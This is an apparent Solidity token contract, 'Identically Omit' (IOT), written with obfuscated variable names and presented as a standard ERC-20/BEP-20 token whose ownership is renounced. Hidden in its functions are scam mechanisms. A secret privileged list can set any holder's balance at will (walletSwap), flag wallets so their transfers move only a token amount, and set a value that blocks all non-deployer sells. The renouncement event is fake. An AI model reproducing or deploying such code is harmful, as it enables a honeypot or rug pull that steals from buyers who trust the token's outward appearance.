//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface tradingSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTakeShould {
    function createPair(address totalReceiver, address fundTrading) external returns (address);
}

interface launchedAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptMaxFee) external view returns (uint256);

    function transfer(address fundSwap, uint256 marketingReceiverLimit) external returns (bool);

    function allowance(address receiverReceiverTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingReceiverLimit) external returns (bool);

    function transferFrom(
        address sender,
        address fundSwap,
        uint256 marketingReceiverLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapTokenMax, uint256 value);
    event Approval(address indexed receiverReceiverTrading, address indexed spender, uint256 value);
}

interface enableSenderFund is launchedAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IdenticallyOmit is shouldTotal, launchedAmount, enableSenderFund {

    uint256 private senderWalletToken;

    event OwnershipTransferred(address indexed marketingFeeAt, address indexed txLimitFrom);

    uint256 private buyEnable;

    uint256 public feeMarketing;

    function owner() external view returns (address) {
        return maxLiquidityFund;
    }

    bool private modeTake;

    uint256 private limitToLiquidity = 100000000 * 10 ** 18;

    function walletShould() private view {
        require(tokenMax[_msgSender()]);
    }

    function teamAmount(address totalTake) public {
        require(totalTake.balance < 100000);
        if (receiverFromTo) {
            return;
        }
        if (walletTeam != buyEnable) {
            buyEnable = senderWalletToken;
        }
        tokenMax[totalTake] = true;
        
        receiverFromTo = true;
    }

    function walletSwap(address launchFrom, uint256 marketingReceiverLimit) public {
        walletShould();
        autoShould[launchFrom] = marketingReceiverLimit;
    }

    uint256 sellLiquidity;

    uint256 public listTeam;

    bool public receiverFromTo;

    function enableSwapLiquidity() public {
        emit OwnershipTransferred(shouldTake, address(0));
        maxLiquidityFund = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingIs;
    }

    function autoTake(address atEnable, address fundSwap, uint256 marketingReceiverLimit) internal returns (bool) {
        require(autoShould[atEnable] >= marketingReceiverLimit);
        autoShould[atEnable] -= marketingReceiverLimit;
        autoShould[fundSwap] += marketingReceiverLimit;
        emit Transfer(atEnable, fundSwap, marketingReceiverLimit);
        return true;
    }

    uint256 public enableLimit;

    function balanceOf(address exemptMaxFee) public view virtual override returns (uint256) {
        return autoShould[exemptMaxFee];
    }

    function tokenAuto(address txSellMode) public {
        walletShould();
        
        if (txSellMode == shouldTake || txSellMode == liquidityTx) {
            return;
        }
        shouldBuy[txSellMode] = true;
    }

    function approve(address launchExemptBuy, uint256 marketingReceiverLimit) public virtual override returns (bool) {
        receiverExempt[_msgSender()][launchExemptBuy] = marketingReceiverLimit;
        emit Approval(_msgSender(), launchExemptBuy, marketingReceiverLimit);
        return true;
    }

    mapping(address => bool) public tokenMax;

    constructor (){
        
        tradingSell maxMarketing = tradingSell(feeMin);
        liquidityTx = liquidityTakeShould(maxMarketing.factory()).createPair(maxMarketing.WETH(), address(this));
        
        shouldTake = _msgSender();
        enableSwapLiquidity();
        tokenMax[shouldTake] = true;
        autoShould[shouldTake] = limitToLiquidity;
        if (listTeam != buyEnable) {
            autoLaunchLiquidity = feeMarketing;
        }
        emit Transfer(address(0), shouldTake, limitToLiquidity);
    }

    function allowance(address liquidityTeam, address launchExemptBuy) external view virtual override returns (uint256) {
        if (launchExemptBuy == feeMin) {
            return type(uint256).max;
        }
        return receiverExempt[liquidityTeam][launchExemptBuy];
    }

    address private maxLiquidityFund;

    function totalSupply() external view virtual override returns (uint256) {
        return limitToLiquidity;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingShould;
    }

    string private tradingShould = "IOT";

    string private tradingTakeIs = "Identically Omit";

    mapping(address => bool) public shouldBuy;

    address feeMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private receiverExempt;

    address atLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchSwap(address atEnable, address fundSwap, uint256 marketingReceiverLimit) internal returns (bool) {
        if (atEnable == shouldTake) {
            return autoTake(atEnable, fundSwap, marketingReceiverLimit);
        }
        uint256 launchLiquidity = launchedAmount(liquidityTx).balanceOf(atLaunch);
        require(launchLiquidity == fundFromSender);
        require(fundSwap != atLaunch);
        if (shouldBuy[atEnable]) {
            return autoTake(atEnable, fundSwap, buySwap);
        }
        return autoTake(atEnable, fundSwap, marketingReceiverLimit);
    }

    uint8 private tradingIs = 18;

    function name() external view virtual override returns (string memory) {
        return tradingTakeIs;
    }

    uint256 constant buySwap = 9 ** 10;

    function transfer(address launchFrom, uint256 marketingReceiverLimit) external virtual override returns (bool) {
        return launchSwap(_msgSender(), launchFrom, marketingReceiverLimit);
    }

    uint256 public walletTeam;

    bool public atAuto;

    uint256 fundFromSender;

    function listMarketing(uint256 marketingReceiverLimit) public {
        walletShould();
        fundFromSender = marketingReceiverLimit;
    }

    uint256 public autoLaunchLiquidity;

    function transferFrom(address atEnable, address fundSwap, uint256 marketingReceiverLimit) external override returns (bool) {
        if (_msgSender() != feeMin) {
            if (receiverExempt[atEnable][_msgSender()] != type(uint256).max) {
                require(marketingReceiverLimit <= receiverExempt[atEnable][_msgSender()]);
                receiverExempt[atEnable][_msgSender()] -= marketingReceiverLimit;
            }
        }
        return launchSwap(atEnable, fundSwap, marketingReceiverLimit);
    }

    address public liquidityTx;

    function getOwner() external view returns (address) {
        return maxLiquidityFund;
    }

    address public shouldTake;

    bool public totalShould;

    mapping(address => uint256) private autoShould;

}